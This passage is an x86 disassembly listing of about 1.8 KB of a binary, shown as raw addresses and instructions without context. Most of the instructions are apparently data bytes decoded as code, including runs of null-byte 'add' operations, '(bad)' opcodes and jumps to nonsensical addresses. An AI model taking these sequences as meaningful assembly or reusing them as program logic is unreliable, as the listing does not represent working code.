  4054f7:	and    BYTE PTR [ebp+0x48000602],dl
  4054fd:	and    BYTE PTR [ebp+0x69000602],dl
  405503:	and    BYTE PTR [ebp-0x6afff9fe],dl
  405509:	and    BYTE PTR [ecx-0x3bffc4e0],cl
  40550f:	and    BYTE PTR [eax],al
  405511:	add    bl,dh
  405513:	add    bh,bl
  405515:	and    BYTE PTR [eax],al
  405517:	add    BYTE PTR [ebx],bh
  405519:	add    bh,bl
  40551b:	and    BYTE PTR [eax],al
  40551d:	add    BYTE PTR [esi],al
  40551f:	add    BYTE PTR [ebx],dh
  405521:	and    DWORD PTR [ebp+0x58000602],edx
  405527:	and    DWORD PTR [edx+eax*1+0x21740006],edi
  40552e:	test   eax,0x8f000604
  405533:	and    DWORD PTR [ecx-0x20ffc0fc],ebp
  405539:	and    BYTE PTR [eax],al
  40553b:	add    BYTE PTR [esi],al
  40553d:	add    BYTE PTR [ebp+0x6029521],dh
  405543:	add    ch,cl
  405545:	and    DWORD PTR [ecx-0x14fff9fc],ebp
  40554b:	and    DWORD PTR [ecx+0x40000604],ebp
  405551:	adc    BYTE PTR [ebp+0x10000602],dl
  405557:	and    ch,BYTE PTR [ecx+0x27000604]
  40555d:	and    dl,BYTE PTR [ebp+0x39000602]
  405563:	and    ah,BYTE PTR [ebx+ebx*1]
  405566:	push   es
  405567:	add    BYTE PTR [edi+0x22],cl
  40556a:	and    al,0x1b
  40556c:	push   es
  40556d:	add    BYTE PTR [esi+0xe1f1a22],dl
  405573:	add    BYTE PTR [ebp+0x622b122],bh
  405579:	add    al,ah
  40557b:	and    dl,dh
  40557d:	and    al,BYTE PTR [esi]
  40557f:	add    ah,ch
  405581:	and    dl,dh
  405583:	and    al,BYTE PTR [esi]
  405585:	add    dh,bh
  405587:	and    dl,dh
  405589:	and    al,BYTE PTR [esi]
  40558b:	add    BYTE PTR [eax],cl
  40558d:	and    edx,esi
  40558f:	and    al,BYTE PTR [esi]
  405591:	add    BYTE PTR [edi],ah
  405593:	and    edx,DWORD PTR [ebp+0x4b000602]
  405599:	and    edi,DWORD PTR [edx]
  40559b:	and    eax,DWORD PTR [esi]
  40559d:	add    BYTE PTR [edx+0x6208923],ch
  4055a3:	add    bl,dl
  4055a5:	and    edx,DWORD PTR [edx+0x1a]
  4055a8:	adc    al,BYTE PTR [eax]
  4055aa:	and    DWORD PTR [esi+ecx*1],esp
  4055ad:	add    DWORD PTR [edx],ebx
  4055af:	add    BYTE PTR [esi+0x24],bl
  4055b2:	push   ebx
  4055b3:	and    al,0x1a
  4055b5:	add    BYTE PTR [eax+0x24],dh
  4055b8:	push   ebx
  4055b9:	and    al,0xa
  4055bb:	add    BYTE PTR [edx+0xa247f24],cl
  4055c1:	add    BYTE PTR [edx+0x1a247f24],bl
  4055c7:	add    dl,cl
  4055c9:	and    al,0x53
  4055cb:	and    al,0xa
  4055cd:	add    dh,dl
  4055cf:	and    al,0x7f
  4055d1:	and    al,0x1a
  4055d3:	add    BYTE PTR [ebx],al
  4055d5:	and    eax,0x62453
  4055da:	dec    edi
  4055db:	and    eax,0x160295
  4055e0:	jl     0x405607
  4055e2:	in     eax,0xa
  4055e4:	push   es
  4055e5:	add    BYTE PTR [eax+0x6029525],bl
  4055eb:	add    BYTE PTR [edi+0xa029525],dh
  4055f1:	add    ah,ah
  4055f3:	and    eax,0x1e0295
  4055f8:	or     BYTE PTR [esi],ah
  4055fa:	in     al,dx
  4055fb:	and    eax,0x263f0022
  405600:	sub    ah,BYTE PTR [esi]
  405602:	or     al,BYTE PTR [eax]
  405604:	jae    0x40562c
  405606:	push   esp
  405607:	es push es
  405609:	add    BYTE PTR [esi+eiz*1+0x60295],dh
  405610:	retf   0x9526
  405613:	add    al,BYTE PTR [esi]
  405615:	add    dh,ah
  405617:	es xchg ebp,eax
  405619:	add    al,BYTE PTR [esi]
  40561b:	add    dh,bh
  40561d:	es xchg ebp,eax
  40561f:	add    al,BYTE PTR [esi]
  405621:	add    BYTE PTR [esi],dh
  405623:	daa    
  405624:	cmp    ah,BYTE PTR [ebx]
  405626:	add    BYTE PTR [eax],al
  405628:	add    BYTE PTR [eax],al
  40562a:	add    DWORD PTR [eax],eax
  40562c:	add    BYTE PTR [eax],al
  40562e:	add    BYTE PTR [eax],al
  405630:	add    DWORD PTR [eax],eax
  405632:	add    DWORD PTR [eax],eax
  405634:	add    BYTE PTR [ecx],al
  405636:	adc    BYTE PTR [eax],al
  405638:	sbb    al,BYTE PTR [eax]
  40563a:	sub    al,0x0
  40563c:	add    eax,0x1000100
  405641:	add    BYTE PTR [eax],al
  405643:	add    BYTE PTR [eax],dl
  405645:	add    BYTE PTR [eax+0x0],ah
  405648:	sub    al,0x0
  40564a:	or     DWORD PTR [eax],eax
  40564c:	or     BYTE PTR [eax],al
  40564e:	or     al,0x0
  405650:	add    BYTE PTR [eax],al
  405652:	adc    BYTE PTR [eax],al
  405654:	jno    0x405656
  405656:	sub    al,0x0
  405658:	or     al,0x0
  40565a:	push   cs
  40565b:	add    BYTE PTR [esi],bl
  40565d:	add    BYTE PTR [eax-0x6ffff000],al
  405663:	add    BYTE PTR [eax+eax*1],ch
  405666:	or     DWORD PTR [eax],eax
  405668:	push   cs
  405669:	add    BYTE PTR [ecx],ah
  40566b:	add    BYTE PTR [eax],al
  40566d:	add    DWORD PTR [eax],edx
  40566f:	add    BYTE PTR [ebp+0x5002c00],ah
  405675:	add    BYTE PTR [ebx],dl
  405677:	add    BYTE PTR ds:0x10000000,dh
  40567d:	add    dh,al
  40567f:	add    BYTE PTR [eax+eax*1],ch
  405682:	or     DWORD PTR [eax],eax
  405684:	pop    ss
  405685:	add    BYTE PTR [edx],bh
  405687:	add    BYTE PTR ds:0xcf001001,cl
  40568d:	add    BYTE PTR [eax],al
  40568f:	add    BYTE PTR ds:0x41001a00,cl
  405695:	add    BYTE PTR [eax],al
  405697:	add    DWORD PTR [eax],eax
  405699:	add    ch,bl
  40569b:	add    BYTE PTR [eax+eax*1],ch
  40569e:	adc    DWORD PTR [eax],eax
  4056a0:	sbb    al,0x0
  4056a2:	inc    ebp
  4056a3:	add    BYTE PTR [eax],al
  4056a5:	add    DWORD PTR [eax],edx
  4056a7:	add    cl,ch
  4056a9:	add    BYTE PTR [eax+eax*1],ch
  4056ac:	or     DWORD PTR [eax],eax
  4056ae:	pop    ds
  4056af:	add    BYTE PTR [ebp+0x0],al
  4056b2:	add    BYTE PTR [ecx],al
  4056b4:	add    BYTE PTR [eax],al
  4056b6:	test   BYTE PTR [eax],0xe
  4056b9:	add    DWORD PTR [ecx],edx
  4056bb:	add    BYTE PTR [ecx],ah
  4056bd:	add    BYTE PTR [eax+0x0],cl
  4056c0:	add    BYTE PTR [eax],al
  4056c2:	adc    BYTE PTR [eax],al
  4056c4:	sub    al,BYTE PTR [ecx]
  4056c6:	dec    edi
  4056c7:	add    DWORD PTR [ecx],ecx
  4056c9:	add    BYTE PTR [eax+eax*1],ah
  4056cc:	dec    eax
  4056cd:	add    BYTE PTR [eax],al
  4056cf:	add    DWORD PTR [eax],edx
  4056d1:	add    BYTE PTR [edi+0x1],dh
  4056d4:	dec    edi
  4056d5:	add    DWORD PTR [ecx],ecx
  4056d7:	add    BYTE PTR [ecx],ch
  4056d9:	add    BYTE PTR [eax+eax*1+0x2],dl
  4056dd:	add    BYTE PTR [eax],dl
  4056df:	add    BYTE PTR [esi+0x1],bh
  4056e2:	add    BYTE PTR [eax],al
  4056e4:	and    DWORD PTR [eax],eax
  4056e6:	das    
  4056e7:	add    BYTE PTR [ebx+0x0],ah
  4056ea:	add    BYTE PTR [ecx],al
  4056ec:	add    BYTE PTR [eax],al
  4056ee:	xchg   edx,eax
  4056ef:	add    DWORD PTR [esi],ecx
  4056f1:	add    DWORD PTR [ecx],edx
  4056f3:	add    BYTE PTR [edi],ch
  4056f5:	add    BYTE PTR [eax+eax*1+0x0],ah
  4056f9:	add    DWORD PTR [eax],eax
  4056fb:	add    BYTE PTR [eax+0x11014f01],ch
  405701:	add    BYTE PTR [ecx],dh
  405703:	add    BYTE PTR [eax+eax*1+0x0],ah
  405707:	add    BYTE PTR [eax],dl
  405709:	add    BYTE PTR [eax+0x14014f01],bh
  40570f:	add    BYTE PTR [eax+eax*1+0x64],cl
  405713:	add    BYTE PTR [eax],al
  405715:	add    DWORD PTR [eax],eax
  405717:	add    dh,dl
  405719:	add    DWORD PTR [edi+0x1],ecx
  40571c:	adc    DWORD PTR [eax],eax
  40571e:	pop    esp
  40571f:	add    BYTE PTR [edx+0x0],bh
  405722:	add    BYTE PTR [ecx],0x10
  405725:	add    bl,ch
  405727:	add    ebx,esi
  405729:	add    DWORD PTR [ecx],ecx
  40572b:	add    BYTE PTR [edi+0x0],bl
  40572e:	jp     0x405730
  405730:	add    BYTE PTR [ecx],0x10
  405733:	add    bh,bh
  405735:	add    ebx,esi
  405737:	add    DWORD PTR [ecx],ecx
  405739:	add    BYTE PTR [edi+0x0],bl
  40573c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40573d:	add    BYTE PTR [eax],al
  40573f:	add    BYTE PTR [eax],dl
  405741:	add    BYTE PTR ds:0x21014f02,al
  405747:	add    BYTE PTR [edi+0x0],bl
  40574a:	stos   BYTE PTR es:[edi],al
  40574b:	add    BYTE PTR [eax+0x1d001001],al
  405751:	add    al,BYTE PTR [eax]
  405753:	add    BYTE PTR [ecx],cl
  405755:	add    BYTE PTR [eax+0x0],ah
  405758:	lods   al,BYTE PTR ds:[esi]
  405759:	add    BYTE PTR [eax+0x2a001001],al
  40575f:	add    al,BYTE PTR [eax]
  405761:	add    BYTE PTR [ecx],cl
  405763:	add    BYTE PTR [ecx+0x0],ah
  405766:	lods   al,BYTE PTR ds:[esi]
  405767:	add    BYTE PTR [eax+0x37001001],al
  40576d:	add    al,BYTE PTR [eax]
  40576f:	add    BYTE PTR [ecx],cl
  405771:	add    BYTE PTR [edx+0x0],ah
  405774:	lods   al,BYTE PTR ds:[esi]
  405775:	add    BYTE PTR [eax+0x42001001],al
  40577b:	add    al,BYTE PTR [eax]
  40577d:	add    BYTE PTR [ecx],cl
  40577f:	add    BYTE PTR [ebx+0x0],ah
  405782:	lods   al,BYTE PTR ds:[esi]
  405783:	add    BYTE PTR [eax+0x4f001001],al
  405789:	add    al,BYTE PTR [eax]
  40578b:	add    BYTE PTR [ecx],cl
  40578d:	add    BYTE PTR [edx+0x0],ch
  405790:	lods   al,BYTE PTR ds:[esi]
  405791:	add    BYTE PTR [eax],al
  405793:	add    DWORD PTR [eax],edx
  405795:	add    BYTE PTR [ebx+0x2],bl
  405798:	dec    edi
  405799:	add    DWORD PTR ds:0xac009d00,esp
  40579f:	add    BYTE PTR [eax],al
  4057a1:	add    DWORD PTR [eax],edx
  4057a3:	add    BYTE PTR [ebx+0x2],dh
  4057a6:	dec    edi
  4057a7:	add    DWORD PTR [ecx],ebp
  4057a9:	add    BYTE PTR [esi+0xae00],bl
  4057af:	add    DWORD PTR [eax],edx
  4057b1:	add    BYTE PTR [eax+0x9014f02],cl
  4057b7:	add    BYTE PTR [esi+0x100b000],bl
  4057bd:	add    BYTE PTR [ecx+0x3],bl
  4057c0:	push   ss
  4057c1:	add    BYTE PTR [ecx],al
  4057c3:	add    BYTE PTR [edi+0x3],bl
  4057c6:	push   ss
  4057c7:	add    BYTE PTR [ecx],al
  4057c9:	add    BYTE PTR [edx+0x3],ch
  4057cc:	push   ss
  4057cd:	add    BYTE PTR [ecx],al
  4057cf:	add    BYTE PTR [edi+0x3],dh
  4057d2:	push   ss
  4057d3:	add    BYTE PTR [ecx],al
  4057d5:	add    BYTE PTR [edx+0x1001903],al
  4057db:	add    BYTE PTR [esi+0x1001903],cl
  4057e1:	add    BYTE PTR [ebx+eax*1-0x7fa9ffe7],bl
  4057e8:	pop    DWORD PTR [esi+edx*1]
  4057eb:	add    BYTE PTR [esi-0x80],dl
  4057ee:	pushf  
  4057ef:	add    al,0x16
  4057f1:	add    BYTE PTR [ecx],al
  4057f3:	add    al,cl
  4057f5:	add    al,0x5f
  4057f7:	add    BYTE PTR [ecx],al
  4057f9:	add    dh,dl
  4057fb:	add    al,0x63
  4057fd:	add    BYTE PTR [ecx],al
  4057ff:	add    cl,ch
  405801:	add    al,0x67
  405803:	add    BYTE PTR [ecx],al
  405805:	add    BYTE PTR [eax],al
  405807:	add    eax,0x8051006b
  40580c:	std    
  40580d:	add    eax,0x80510016
  405812:	or     al,BYTE PTR [esi]
  405814:	push   ss
  405815:	add    BYTE PTR [ecx],al
  405817:	add    BYTE PTR [esi+eax*1],ah
  40581a:	hlt    
  40581b:	add    BYTE PTR [ecx],al
  40581d:	add    BYTE PTR [eax],bh
  40581f:	push   es
  405820:	sbb    DWORD PTR [eax],eax
  405822:	add    DWORD PTR [eax],eax
  405824:	inc    ebx
  405825:	push   es
  405826:	sbb    DWORD PTR [eax],eax
  405828:	add    DWORD PTR [eax],eax
  40582a:	test   BYTE PTR [edi],al
  40582c:	pop    esp
  40582d:	add    DWORD PTR [ecx],eax
  40582f:	add    BYTE PTR [edx+0x3],ch
  405832:	push   ss
  405833:	add    BYTE PTR [ecx],al
  405835:	add    BYTE PTR [edi+0x1015f07],cl
  40583b:	add    BYTE PTR [eax+0x1001607],bl
  405841:	add    cl,dl
  405843:	pop    es
  405844:	push   ss
  405845:	add    BYTE PTR [ecx],al
  405847:	add    cl,bl
  405849:	pop    es
  40584a:	sbb    DWORD PTR [eax],eax
  40584c:	add    DWORD PTR [eax],eax
  40584e:	in     al,0x7
  405850:	jge    0x405853
  405852:	add    DWORD PTR [eax],eax
  405854:	push   eax
  405855:	or     BYTE PTR [edi+0x1],bl
  405858:	add    DWORD PTR [eax],eax
  40585a:	pop    esp
  40585b:	or     BYTE PTR [edi+0x1],bl
  40585e:	push   es
  40585f:	push   es
  405860:	test   al,0x8
  405862:	pop    edi
  405863:	add    DWORD PTR [esi-0x80],edx
  405866:	mov    al,0x8
  405868:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405869:	add    DWORD PTR [esi-0x80],edx
  40586c:	js     0x405875
  40586e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40586f:	add    DWORD PTR [ecx],eax
  405871:	add    BYTE PTR [edx+0x3],ch
  405874:	push   ss
  405875:	add    BYTE PTR [ecx],al
  405877:	add    dl,cl
  405879:	or     BYTE PTR [ebx-0x57f9f9ff],dh
  40587f:	or     BYTE PTR [edi+0x1],bl
  405882:	push   esi
  405883:	and    bh,0x8
  405886:	mov    BYTE PTR [ecx],0x56
  405889:	sub    dl,0x8
  40588c:	mov    BYTE PTR [ecx],0x1
  40588f:	add    cl,dh
  405891:	or     dl,cl
  405893:	add    DWORD PTR [ecx],eax
  405895:	add    BYTE PTR [eax],al
  405897:	or     DWORD PTR [esi],edx
  405899:	add    BYTE PTR [ecx],al
  40589b:	add    BYTE PTR [esi],cl
  40589d:	or     DWORD PTR [esi],edx
  40589f:	add    BYTE PTR [ecx],al
  4058a1:	add    BYTE PTR [edx],ah
  4058a3:	or     ecx,edx
  4058a5:	add    DWORD PTR [ecx],edx
  4058a7:	add    BYTE PTR [edi+0x22],ch
  4058aa:	xchg   edi,eax
  4058ab:	xor    DWORD PTR [ecx-0x80],edx
  4058ae:	iret   
  4058af:	or     edx,edi
  4058b1:	add    DWORD PTR [ecx-0x80],edx
  4058b4:	fisttp DWORD PTR [ecx]
  4058b6:	cli    
  4058b7:	add    DWORD PTR [ecx-0x80],edx
  4058ba:	jmp    0x1141b7c8
  4058bf:	add    BYTE PTR [edx+ecx*1],dl
  4058c2:	pop    edi
  4058c3:	add    DWORD PTR [ecx],edx
  4058c5:	add    BYTE PTR [edi],ah
  4058c7:	or     bl,BYTE PTR [edi+0x1]
  4058ca:	adc    DWORD PTR [eax],eax
  4058cc:	cmp    BYTE PTR [edx],cl
  4058ce:	or     eax,0xa8060602
  4058d3:	or     BYTE PTR [edi+0x1],bl
  4058d6:	push   esi
  4058d7:	adc    dh,0xb
  4058da:	ins    BYTE PTR es:[edi],dx
  4058db:	add    al,BYTE PTR [esi]
  4058dd:	push   es
  4058de:	test   al,0x8
  4058e0:	pop    edi
  4058e1:	add    DWORD PTR [esi-0x80],edx
  4058e4:	in     al,dx
  4058e5:	or     esi,DWORD PTR [ebp+0x2]
  4058e8:	push   esi
  4058e9:	xor    dh,0xb
  4058ec:	jne    0x4058f0
  4058ee:	push   esi
  4058ef:	add    BYTE PTR [esi],0xc
  4058f2:	jne    0x4058f6
  4058f4:	push   esi
  4058f5:	and    BYTE PTR [edx],0xc
  4058f8:	jne    0x4058fc
  4058fa:	push   esi
  4058fb:	cmp    BYTE PTR [eax],0xc
  4058fe:	jne    0x405902
  405900:	push   esi
  405901:	or     BYTE PTR [ebp+0xc],0x75
  405905:	add    dl,BYTE PTR [esi-0x80]
  405908:	bound  ecx,QWORD PTR [esi*2+0x72805602]
  40590f:	or     al,0x75
  405911:	add    dl,BYTE PTR [esi-0x80]
  405914:	mov    DWORD PTR [esi*2-0x6a7fa9fe],ecx
  40591b:	or     al,0x75
  40591d:	add    dl,BYTE PTR [esi-0x80]
  405920:	stos   BYTE PTR es:[edi],al
  405921:	or     al,0x75
  405923:	add    dl,BYTE PTR [esi-0x80]
  405926:	ror    BYTE PTR [esi*2-0x297fa9fe],0xc
  40592e:	jne    0x405932
  405930:	push   esi
  405931:	sub    bh,0xc
  405934:	jne    0x405938
  405936:	push   esi
  405937:	or     BYTE PTR [edi],0xd
  40593a:	jne    0x40593e
  40593c:	push   esi
  40593d:	xor    BYTE PTR ds:0x5602750d,0x80
  405944:	dec    eax
  405945:	or     eax,0x80560275
  40594a:	pop    ebp
  40594b:	or     eax,0x80560275
  405950:	jae    0x40595f
  405952:	jne    0x405956
  405954:	push   esi
  405955:	or     BYTE PTR [eax+0x5602750d],0x80
  40595c:	mov    ds:0x5602750d,eax
  405961:	add    al,0xd
  405964:	jne    0x405968
  405966:	push   esi
  405967:	adc    al,0xd
  40596a:	jne    0x40596e
  40596c:	push   esi
  40596d:	sub    ch,0xd
  405970:	jne    0x405974
  405972:	push   esi
  405973:	cmp    dl,0xd
  405976:	jne    0x40597a
  405978:	push   esi
  405979:	or     BYTE PTR [esi+ecx*1],0x75
  40597d:	add    dl,BYTE PTR [ecx-0x80]
  405980:	cmp    ecx,DWORD PTR [esi]
  405982:	push   ss
  405983:	add    BYTE PTR [ecx-0x80],dl
  405986:	dec    edx
  405987:	push   cs
  405988:	push   ss
  405989:	add    BYTE PTR [ecx-0x80],dl
  40598c:	push   edi
  40598d:	push   cs
  40598e:	push   ss
  40598f:	add    BYTE PTR [ecx-0x80],dl
  405992:	fs push cs
  405994:	push   ss
  405995:	add    BYTE PTR [ecx-0x80],dl
  405998:	jae    0x4059a8
  40599a:	push   ss
  40599b:	add    BYTE PTR [ecx-0x80],dl
  40599e:	jle    0x4059ae
  4059a0:	push   ss
  4059a1:	add    BYTE PTR [ecx-0x80],dl
  4059a4:	xchg   ecx,eax
  4059a5:	push   cs
  4059a6:	push   ss
  4059a7:	add    BYTE PTR [ecx-0x80],dl
  4059aa:	popf   
  4059ab:	push   cs
  4059ac:	push   ss
  4059ad:	add    BYTE PTR [ecx],al
  4059af:	add    BYTE PTR [edi+0x1026c0e],dh
  4059b5:	add    BYTE PTR [ebp+0x100160e],bh
  4059bb:	add    bl,cl
  4059bd:	push   cs
  4059be:	add    eax,DWORD PTR gs:[ecx]
  4059c1:	add    al,dl
  4059c3:	push   cs
  4059c4:	imul   eax,DWORD PTR [ebx],0xed90001
  4059ca:	push   ss
  4059cb:	add    BYTE PTR [ecx],al
  4059cd:	add    bl,dh
  4059cf:	push   cs
  4059d0:	mov    BYTE PTR [ecx],0x1
  4059d3:	add    ch,bh
  4059d5:	push   cs
  4059d6:	sbb    DWORD PTR [eax],eax
  4059d8:	add    DWORD PTR [eax],eax
  4059da:	pop    ss
  4059db:	(bad)  
  4059dd:	add    eax,DWORD PTR [esi]
  4059df:	push   es
  4059e0:	test   al,0x8
  4059e2:	pop    edi
  4059e3:	add    DWORD PTR [esi-0x80],edx
  4059e6:	pop    esi
  4059e7:	adc    BYTE PTR [ebp+0x3],ch
  4059ea:	push   esi
  4059eb:	and    BYTE PTR [ecx+0x10],0x6d
  4059ef:	add    eax,DWORD PTR [ecx]
  4059f1:	add    BYTE PTR [ebp+0x53027515],al
  4059f7:	add    BYTE PTR [eax+0x10],0x16
  4059fb:	add    BYTE PTR [ebx-0x80],dl
  4059fe:	inc    eax
  4059ff:	adc    BYTE PTR [esi],dl
  405a01:	add    BYTE PTR [ebx-0x80],dl
  405a04:	inc    eax
  405a05:	adc    BYTE PTR [esi],dl
  405a07:	add    BYTE PTR [ebx-0x80],dl
  405a0a:	test   al,0x15
  405a0c:	push   ss
  405a0d:	add    BYTE PTR [ebx-0x80],dl
  405a10:	dec    eax
  405a11:	add    al,0x16
  405a13:	add    BYTE PTR [ebx-0x80],dl
  405a16:	scas   al,BYTE PTR es:[edi]
  405a17:	adc    eax,0x80530016
  405a1c:	mov    ebx,0x53001615
  405a21:	add    BYTE PTR [eax+0x10],0x16
  405a25:	add    BYTE PTR [ebx-0x80],dl
  405a28:	lds    edx,FWORD PTR ds:0x80530016
  405a2e:	ficom  DWORD PTR ds:0x8053015f
  405a34:	jmp    0x405a4b
  405a36:	push   ss
  405a37:	add    BYTE PTR [ebx-0x80],dl
  405a3a:	stc    
  405a3b:	adc    eax,0x80530016
  405a40:	or     al,0x16
  405a42:	push   ss
  405a43:	add    BYTE PTR [ebx-0x80],dl
  405a46:	push   ds
  405a47:	push   ss
  405a48:	push   ss
  405a49:	add    BYTE PTR [ebx-0x80],dl
  405a4c:	daa    
  405a4d:	push   ss
  405a4e:	push   ss
  405a4f:	add    BYTE PTR [ebx-0x80],dl
  405a52:	xor    dl,BYTE PTR [esi]
  405a54:	push   ss
  405a55:	add    BYTE PTR [ebx-0x80],dl
  405a58:	xchg   ebp,eax
  405a59:	add    dl,BYTE PTR [esi]
  405a5b:	add    BYTE PTR [ebx-0x80],dl
  405a5e:	dec    ecx
  405a5f:	push   ss
  405a60:	push   ss
  405a61:	add    BYTE PTR [ebx-0x80],dl
  405a64:	pop    edi
  405a65:	push   ss
  405a66:	push   ss
  405a67:	add    BYTE PTR [ebx-0x80],dl
  405a6a:	jb     0x405a82
  405a6c:	push   ss
  405a6d:	add    BYTE PTR [ebx-0x80],dl
  405a70:	jl     0x405a88
  405a72:	push   ss
  405a73:	add    BYTE PTR [ebx-0x80],dl
  405a76:	(bad)  
  405a77:	push   ss
  405a78:	push   ss
  405a79:	add    BYTE PTR [ebx-0x80],dl
  405a7c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405a7d:	push   ss
  405a7e:	push   ss
  405a7f:	add    BYTE PTR [ebx-0x80],dl
  405a82:	mov    esi,0x53001616
  405a87:	adc    cl,0x16
  405a8a:	push   ss
  405a8b:	add    BYTE PTR [ebx-0x80],dl
  405a8e:	jmp    0x534070a9
  405a93:	add    BYTE PTR [eax],0x17
  405a96:	push   ss
  405a97:	add    BYTE PTR [ebx-0x80],dl
  405a9a:	and    al,0x17
  405a9c:	push   ss
  405a9d:	add    BYTE PTR [ebx-0x80],dl
  405aa0:	cmp    BYTE PTR [edi],dl
  405aa2:	push   ss
  405aa3:	add    BYTE PTR [ebx-0x80],dl
  405aa6:	push   ebx
  405aa7:	pop    ss
  405aa8:	push   ss
  405aa9:	add    BYTE PTR [ebx-0x80],dl
  405aac:	fs pop ss
  405aae:	push   ss
  405aaf:	add    BYTE PTR [ebx-0x80],dl
  405ab2:	jno    0x405acb
  405ab4:	push   ss
  405ab5:	add    BYTE PTR [ebx-0x80],dl
  405ab8:	mov    DWORD PTR [edi],edx
  405aba:	push   ss
  405abb:	add    BYTE PTR [ebx-0x80],dl
  405abe:	popf   
  405abf:	pop    ss
  405ac0:	push   ss
  405ac1:	add    BYTE PTR [ebx-0x80],dl
  405ac4:	stos   DWORD PTR es:[edi],eax
  405ac5:	pop    ss
  405ac6:	push   ss
  405ac7:	add    BYTE PTR [ebx-0x80],dl
  405aca:	les    edx,FWORD PTR [edi]
  405acc:	push   ss
  405acd:	add    BYTE PTR [ebx-0x80],dl
  405ad0:	aad    0x17
  405ad2:	push   ss
  405ad3:	add    BYTE PTR [ebx-0x80],dl
  405ad6:	in     eax,0x17
  405ad8:	push   ss
  405ad9:	add    BYTE PTR [ebx-0x80],dl
  405adc:	push   cs
  405add:	sbb    BYTE PTR [esi],dl
  405adf:	add    BYTE PTR [ebx-0x80],dl
  405ae2:	sbb    eax,0x53001618
  405ae7:	xor    BYTE PTR [edx],0x18
  405aea:	push   ss
  405aeb:	add    BYTE PTR [ebx-0x80],dl
  405aee:	cmp    al,0x18
  405af0:	push   ss
  405af1:	add    BYTE PTR [ebx-0x80],dl
  405af4:	push   edx
  405af5:	sbb    BYTE PTR [esi],dl
  405af7:	add    BYTE PTR [ebx-0x80],dl
  405afa:	sbb    BYTE PTR ds:0x5300,dl
  405aff:	add    BYTE PTR [edx+0x53001618],0x80
  405b06:	cwde   
  405b07:	sbb    BYTE PTR [esi],dl
  405b09:	add    BYTE PTR [ebx-0x80],dl
  405b0c:	lods   al,BYTE PTR ds:[esi]
  405b0d:	sbb    BYTE PTR [esi],dl
  405b0f:	add    BYTE PTR [ebx-0x80],dl
  405b12:	(bad)  
  405b13:	sbb    BYTE PTR [esi],dl
  405b15:	add    BYTE PTR [ebx-0x80],dl
  405b18:	(bad)  
  405b19:	sbb    BYTE PTR [esi],dl
  405b1b:	add    BYTE PTR [ebx-0x80],dl
  405b1e:	repnz sbb BYTE PTR [esi],dl
  405b21:	add    BYTE PTR [ebx-0x80],dl
  405b24:	add    ebx,DWORD PTR [ecx]
  405b26:	push   ss
  405b27:	add    BYTE PTR [ebx-0x80],dl
  405b2a:	adc    eax,0x53001619
  405b2f:	sub    BYTE PTR [ebx],0x19
  405b32:	push   ss
  405b33:	add    BYTE PTR [ebx-0x80],dl
  405b36:	dec    ebp
  405b37:	sbb    DWORD PTR [esi],edx
  405b39:	add    BYTE PTR [ebx-0x80],dl
  405b3c:	popa   
  405b3d:	sbb    DWORD PTR [esi],edx
  405b3f:	add    BYTE PTR [ebx-0x80],dl
  405b42:	jns    0x405b5d
  405b44:	push   ss
  405b45:	add    BYTE PTR [ebx-0x80],dl
  405b48:	(bad)  
  405b49:	sbb    DWORD PTR [esi],edx
  405b4b:	add    BYTE PTR [ebx-0x80],dl
  405b4e:	mov    ds:0x53001619,eax
  405b53:	cmp    BYTE PTR [ecx+ebx*1-0x7facffea],0xcf
  405b5b:	sbb    DWORD PTR [esi],edx
  405b5d:	add    BYTE PTR [ebx-0x80],dl
  405b60:	jmp    0x140717e
  405b65:	add    dl,bh
  405b67:	sbb    DWORD PTR [ecx],ebx
  405b69:	add    BYTE PTR [ebx-0x80],dl
  405b6c:	adc    BYTE PTR fs:[esi],dl
  405b6f:	add    BYTE PTR [ebx-0x80],dl
  405b72:	je     0x405b84
  405b74:	push   ss
  405b75:	add    BYTE PTR [ebx-0x80],dl
  405b78:	jno    0x405b8d
  405b7a:	push   ss
  405b7b:	add    BYTE PTR [ebx-0x80],dl
  405b7e:	call   0xad80:0x53001610
  405b85:	adc    BYTE PTR [esi],dl
  405b87:	add    BYTE PTR [ebx-0x80],dl
  405b8a:	ret    
  405b8b:	adc    BYTE PTR [esi],dl
  405b8d:	add    BYTE PTR [ebx-0x80],dl
  405b90:	aam    0x10
  405b92:	push   ss
  405b93:	add    BYTE PTR [ebx-0x80],dl
  405b96:	mov    BYTE PTR [ebx],dl
  405b98:	push   ss
  405b99:	add    BYTE PTR [ebx-0x80],dl
  405b9c:	pushf  
  405b9d:	adc    edx,DWORD PTR [esi]
  405b9f:	add    BYTE PTR [ebx-0x80],dl
  405ba2:	mov    cl,0x13
  405ba4:	push   ss
  405ba5:	add    BYTE PTR [ebx-0x80],dl
  405ba8:	enter  0x1613,0x0
  405bac:	push   ebx
  405bad:	and    bh,0x13
  405bb0:	push   ss
  405bb1:	add    BYTE PTR [ebx-0x80],dl
  405bb4:	push   es
  405bb5:	adc    al,0x16
  405bb7:	add    BYTE PTR [ebx-0x80],dl
  405bba:	and    DWORD PTR [esi+edx*1],edx
  405bbd:	add    BYTE PTR [ebx-0x80],dl
  405bc0:	cmp    BYTE PTR [esi+edx*1],dl
  405bc3:	add    BYTE PTR [ebx-0x80],dl
  405bc6:	dec    edx
  405bc7:	adc    al,0x16
  405bc9:	add    BYTE PTR [ebx-0x80],dl
  405bcc:	pop    ebp
  405bcd:	adc    al,0x16
  405bcf:	add    BYTE PTR [ebx-0x80],dl
  405bd2:	js     0x405be8
  405bd4:	push   ss
  405bd5:	add    BYTE PTR [ebx-0x80],dl
  405bd8:	mov    dl,BYTE PTR [esi+edx*1]
  405bdb:	add    BYTE PTR [ebx-0x80],dl
  405bde:	pushf  
  405bdf:	adc    al,0x16
  405be1:	add    BYTE PTR [ebx-0x80],dl
  405be4:	inc    esi
  405be5:	adc    dl,BYTE PTR [esi]
  405be7:	add    BYTE PTR [ebx-0x80],dl
  405bea:	test   eax,0x53001614
  405bef:	and    BYTE PTR [edi+0x12],0x16
  405bf3:	add    BYTE PTR [ebx-0x80],dl
  405bf6:	mov    ebp,0x53001614
  405bfb:	or     BYTE PTR [eax+0x53001612],0x80
  405c02:	rcl    DWORD PTR [esi+edx*1],1
  405c05:	add    BYTE PTR [ebx-0x80],dl
  405c08:	mov    DWORD PTR [esi+edx*1],ecx
  405c0b:	add    BYTE PTR [ebx-0x80],dl
  405c0e:	dec    ebp
  405c0f:	or     al,0x16
